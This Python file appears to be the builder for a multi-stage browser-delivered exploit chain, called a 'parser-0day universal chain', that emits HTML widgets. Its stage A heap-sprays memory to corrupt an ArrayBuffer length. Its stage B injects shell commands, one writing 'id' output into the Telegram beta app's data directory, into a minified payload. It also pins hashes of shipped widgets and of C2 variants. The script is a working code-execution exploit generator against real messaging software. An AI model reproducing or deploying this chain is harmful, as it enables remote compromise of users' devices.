#!/usr/bin/env python3
"""Canonical c2560s widget builder; parser-0day universal chain.

Reproduces the shipped universal widgets **byte-exactly** from in-tree sources:

    stage A  -> parametric generator (final sweep + SAFE probe variant)
    stage B  -> device/endG8s.js with {DBG, CALIGN, CMD} substitution, then
                `terser -c passes=2 -m`, then padded to B_TARGET with /*P...*/
    stage C  -> fixed reporter, padded to C_TARGET
    wrapper  -> <!doctype html><body><div id="v">Ok</div><script id=stageA/B/C>

Pinned references (SHA-256 of the shipped widgets). Every regenerated file is
asserted byte-equal to its pin; the only unpinned output is the host debug
twin, which was stale (B=6,897, segfaulted on the harness) and is intentionally
regenerated at B=7,182 by this builder.

    c2560_final_c2560s_72929.html  992a51267a385c57635f5aed835aa29a1006ca8c584ca3843b265cd2c71318b4
    c2560_debug_c2560s_72929.html  ef87921f72081d812e55a73bc1f2b2d597d1ec4c69d6c3b2defeeb496fe47b19
    c2560_probe_c2560s_{72929,host}.html (identical bytes)
                                   b9104faef8be5e06fc451fc11c62aea546b8e995d56585a13c53b897cdeae41f
    c2560_final_c2560s_host.html   e95603f4080d9ff319852adcb80dcf0591a27d6b546d3d9dd5cbd394b384c8c2
    c2560_debug_c2560s_host.html   f053685d9a966494cd8ed5f44a9c9d22c9fbbc48b14b9773feffdce3fcda679c
                                   (regenerated at B=7,182, CALIGN=1; host harness
                                   `END=HF READY` 3/3)

Terser note: `passes=2` is REQUIRED. With the default single pass the final B
minifies to 7,212 B (drift documented in notes/audit_universality_20261107.md
§3.3); passes=2 reproduces the shipped 7,182 B exactly (verified identical on
terser 5.16.9, 5.24.0, 5.31.6, 5.38.0). The CMD literal must be inlined at the
usage site (not kept as `var CMD`), otherwise terser hoists it and the output
drifts.

Usage:
    python3 device/gen_c2560s.py            # verify + write the 6 canonical widgets
    python3 device/gen_c2560s.py --no-write # dry run (report only)
    python3 device/gen_c2560s.py --outdir /tmp/x --no-write

The C2 variants (gen_c2_widget.py) consume the two finals as --src; this builder
optionally re-checks them against the shipped c2 SHAs (never overwrites them).
"""
import argparse
import hashlib
import tempfile
import os
import re
import subprocess
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
WIDGET = os.path.join(HERE, "widget")
ENDG = os.path.join(HERE, "endG8s.js")

CMD_DEV = "id>/data/data/org.telegram.messenger.beta/files/n1"      # 50 B
CMD_HOST = "id>/tmp/hf_proof;echo HF>>/tmp/hf_proof"                # 39 B

B_TARGET = 7182
C_TARGET = 408

PINNED = {
    "c2560_final_c2560s_72929.html":
        "992a51267a385c57635f5aed835aa29a1006ca8c584ca3843b265cd2c71318b4",
    "c2560_debug_c2560s_72929.html":
        "ef87921f72081d812e55a73bc1f2b2d597d1ec4c69d6c3b2defeeb496fe47b19",
    "c2560_probe_c2560s_72929.html":
        "b9104faef8be5e06fc451fc11c62aea546b8e995d56585a13c53b897cdeae41f",
    "c2560_probe_c2560s_host.html":
        "b9104faef8be5e06fc451fc11c62aea546b8e995d56585a13c53b897cdeae41f",
    "c2560_final_c2560s_host.html":
        "e95603f4080d9ff319852adcb80dcf0591a27d6b546d3d9dd5cbd394b384c8c2",
    "c2560_debug_c2560s_host.html":
        "f053685d9a966494cd8ed5f44a9c9d22c9fbbc48b14b9773feffdce3fcda679c",
}
PIN_C2 = {
    "c2560_final_c2560s_c2_72929.html":
        "26f670aeaf6e6043b18bbb76eeb0ed7933c50748ee4c7fa359da51c539bac40b",
    "c2560_final_c2560s_c2_host.html":
        "cf02906381afcffc1254d1fa15c8b7a08d312f219b767c74b0af5b2676b185ed",
}

REC_TERM = [0x04, 0, 0, 0, 5, 0, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0]
REC_JUMP = [0x04, 0, 0, 0, 5, 0, 0, 0, 0xFF, 0xFF, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0]


def pad(src, target):
    d = target - len(src)
    if d < 0:
        raise SystemExit("source longer than target: %d > %d" % (len(src), target))
    if d == 0:
        return src
    if d < 4:
        return src + " " * d
    return src + "/*" + "P" * (d - 4) + "*/"


def stage_a(fs=2544, nab=1100, drain=3000, tn=600, nfloat=110,
            nsym=65600, keep=3000):
    floats = "+".join(["1.5"] * nfloat)
    return ('"use strict";\n'
            'function f([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return %s; }\n'
            'var SY = new Array(%d);\n'
            'for (var i = 0; i < %d; i++) SY[i] = Symbol();\n'
            '/* keep only a window of the last symbols: the atom array stays\n'
            '   large and slot 65535 stays live; the other symbol strings are\n'
            '   freed to reclaim heap. */\n'
            'var KEEP = SY.slice(%d - %d); SY = null;\n'
            'var RT = [%s], RJ = [%s];\n'
            'var PB = new Uint8Array(%d);\n'
            'var A = new Array(%d), UV = new Array(%d);\n'
            'for (var i = 0; i < %d; i++) { A[i] = new ArrayBuffer(%d); }\n'
            'for (var i = 0; i < %d; i++) { UV[i] = new Uint8Array(A[i]); }\n'
            'var D = new Array(%d);\n'
            'for (var i = 0; i < %d; i++) D[i] = new ArrayBuffer(64);\n'
            'var T = new Array(%d);\n'
            'for (var i = 0; i < %d; i++) T[i] = new ArrayBuffer(64);\n'
            'T[%d-2] = null;\n'
            'var mark = "NOCORR";\n'
            'function fill(p, q) {\n'
            '  PB.fill(0);\n'
            '  for (var o = p; o + 40 <= %d; o += 40) {\n'
            '    for (var k = 0; k < 20; k++) { PB[o + k] = (q ? RJ[k] : RT[k]); PB[o + 20 + k] = (q ? RT[k] : RJ[k]); }\n'
            '  }\n'
            '  for (var i = 0; i < %d; i++) UV[i].set(PB);\n'
            '}\n'
            'var hit = 0;\n'
            'for (var ph = 0; ph < 20 && !hit; ph += 4) {\n'
            '  for (var q = 0; q < 2 && !hit; q++) {\n'
            '    fill(ph, q);\n'
            '    try { f(); } catch (e) {}\n'
            '    for (var i = 0; i < %d; i++) {\n'
            '      if (T[i] !== null && T[i].byteLength > 1024) {\n'
            '        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength;\n'
            '        break;\n'
            '      }\n'
            '    }\n'
            '  }\n'
            '}\n'
            'var V = null, VAB = null;\n'
            'for (var i = 0; i < %d; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }\n'
            'if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }\n'
            'globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;\n'
            'throw new Error("RESULT " + mark);\n'
            % (floats, nsym, nsym, nsym, keep,
               ",".join(str(b) for b in REC_TERM), ",".join(str(b) for b in REC_JUMP),
               fs, nab, nab, nab, fs, nab, drain, drain, tn, tn, tn, fs, nab, tn, tn))


def stage_a_probe(a):
    """SAFE2560C probe: same length as the final A, all-4 filler, TCHG-only hit."""
    b = a.replace('var mark = "NOCORR";', 'var mark = "SAFE2560C";')
    b = b.replace('''  PB.fill(0);
  for (var o = p; o + 40 <= 2544; o += 40) {
    for (var k = 0; k < 20; k++) { PB[o + k] = (q ? RJ[k] : RT[k]); PB[o + 20 + k] = (q ? RT[k] : RJ[k]); }
  }
''', '  for (var i2 = 0; i2 < 2544; i2 += 4) PB[i2] = 4;\n')
    b = b.replace('''      if (T[i] !== null && T[i].byteLength > 1024) {
        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength;
        break;
      }
''', '      if (T[i] !== null && T[i].byteLength > 1024) { hit = 1; mark = "TCHG[" + i + "]=" + T[i].byteLength; }\n')
    return pad(b, len(a))


def stage_b(dbg, calign, cmd):
    src = open(ENDG).read()
    m = re.search(r'var CMD="([^"]*)";', src)
    if not m:
        raise SystemExit("endG8s.js: CMD literal not found")
    anchors = ['var DBG=1;', 'var CALIGN=4;',
               'for(o=0;o<CMD.length;o++)FAR[o]=CMD.charCodeAt(o)&255;',
               'FAR[CMD.length]=0;']
    for a in anchors:
        if a not in src:
            raise SystemExit("endG8s.js drift: anchor %r missing" % a)
    s = src.replace(m.group(0), '')
    s = s.replace('var DBG=1;', 'var DBG=%d;' % dbg)
    s = s.replace('var CALIGN=4;', 'var CALIGN=%d;' % calign)
    s = s.replace('for(o=0;o<CMD.length;o++)FAR[o]=CMD.charCodeAt(o)&255;',
                  'for(o=0;o<%d;o++)FAR[o]="%s".charCodeAt(o)&255;' % (len(cmd), cmd))
    s = s.replace('FAR[CMD.length]=0;', 'FAR[%d]=0;' % len(cmd))
    r = subprocess.run(['terser', '-c', 'passes=2', '-m', '--', '/dev/stdin'],
                       input=s, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit("terser failed: %s" % r.stderr[:400])
    core = r.stdout.rstrip('\n')
    return pad(core, B_TARGET)


STAGE_C_CORE = ('if(1){try{var m=typeof mark!="undefined"?mark:"-",'
                'e=typeof MEGA!="undefined"?MEGA:"-";var x="S1 "+m+" END="+e;'
                'var D=document.getElementById("v");D&&(D.textContent=x)}catch(r){}}')
assert len(STAGE_C_CORE) == 177, len(STAGE_C_CORE)
STAGE_C = pad(STAGE_C_CORE, C_TARGET)

PROBE_B_CORE = 'if (0) { var PB = 0; }\n'


def widget(a, b, c):
    return ('<!doctype html><body><div id="v">Ok</div>'
            '<script id="stageA">' + a + '</script>'
            '<script id="stageB">' + b + '</script>'
            '<script id="stageC">' + c + '</script>')


def sha256(b):
    return hashlib.sha256(b.encode("utf-8")).hexdigest()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--outdir", default=WIDGET)
    ap.add_argument("--no-write", action="store_true",
                    help="dry run: report only, never touch files")
    ap.add_argument("--check-c2", action="store_true",
                    help="also re-verify the shipped c2 variants via gen_c2_widget.py")
    a = ap.parse_args()

    A_fin = stage_a()
    A_prb = stage_a_probe(A_fin)
    assert len(A_fin) == 2228 and len(A_prb) == 2228, (len(A_fin), len(A_prb))
    B_dev_fin = stage_b(0, 4, CMD_DEV)
    B_dev_dbg = stage_b(1, 4, CMD_DEV)
    B_host_fin = stage_b(0, 1, CMD_HOST)
    B_host_dbg = stage_b(1, 1, CMD_HOST)
    B_prb = pad(PROBE_B_CORE, B_TARGET)
    for name, b in [("B dev final", B_dev_fin), ("B dev debug", B_dev_dbg),
                    ("B host final", B_host_fin), ("B host debug", B_host_dbg),
                    ("B probe", B_prb)]:
        assert len(b) == B_TARGET, (name, len(b))

    outs = {
        "c2560_final_c2560s_72929.html": widget(A_fin, B_dev_fin, STAGE_C),
        "c2560_debug_c2560s_72929.html": widget(A_fin, B_dev_dbg, STAGE_C),
        "c2560_probe_c2560s_72929.html": widget(A_prb, B_prb, STAGE_C),
        "c2560_final_c2560s_host.html": widget(A_fin, B_host_fin, STAGE_C),
        "c2560_debug_c2560s_host.html": widget(A_fin, B_host_dbg, STAGE_C),
        "c2560_probe_c2560s_host.html": widget(A_prb, B_prb, STAGE_C),
    }

    ok = True
    print("%-34s %8s %7s %s" % ("file", "raw", "zlib9", "pin"))
    for name, text in outs.items():
        raw = len(text.encode("utf-8"))
        z = len(zlib.compress(text.encode("utf-8"), 9))
        sh = sha256(text)
        pin = PINNED.get(name)
        status = "PIN-OK" if (pin and sh == pin) else \
                 ("PIN-MISMATCH" if pin else "UNPINNED(new)")
        if pin and sh != pin:
            ok = False
        if raw > 32768 or z > 4096:
            status += " OVER-SIZE"
            ok = False
        print("%-34s %8d %7d %s" % (name, raw, z, status))
        path = os.path.join(a.outdir, name)
        if not a.no_write and (pin is None or sh == pin):
            with open(path, "w", encoding="utf-8") as f:
                f.write(text)
        elif a.no_write and pin is not None and sh == pin and not os.path.exists(path):
            print("  (missing on disk, use --no-write off to restore)")

    if not a.no_write:
        dh = os.path.join(a.outdir, "c2560_debug_c2560s_host.html")
        print("debug-host new SHA-256:", sha256(outs["c2560_debug_c2560s_host.html"]))
        print("  (regenerated at B=%d; pin it after harness validation)" % B_TARGET)

    if a.check_c2:
        gen = os.path.join(HERE, "gen_c2_widget.py")
        for name, pin in PIN_C2.items():
            src_name = name.replace("_c2_72929.html", "_72929.html").replace(
                "_c2_host.html", "_host.html")
            tmp = os.path.join(tempfile.gettempdir(), "_c2check_%s" % name)
            r = subprocess.run([sys.executable, gen, "--src",
                                os.path.join(a.outdir, src_name), "--out", tmp],
                               capture_output=True, text=True)
            if r.returncode != 0:
                print("c2 check %s: generator failed: %s" % (name, r.stderr[-200:]))
                ok = False
                continue
            sh = sha256(open(tmp, encoding="utf-8").read())
            print("%-34s c2-check %s" % (name, "OK" if sh == pin else
                                         "MISMATCH %s" % sh))
            if sh != pin:
                ok = False
    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
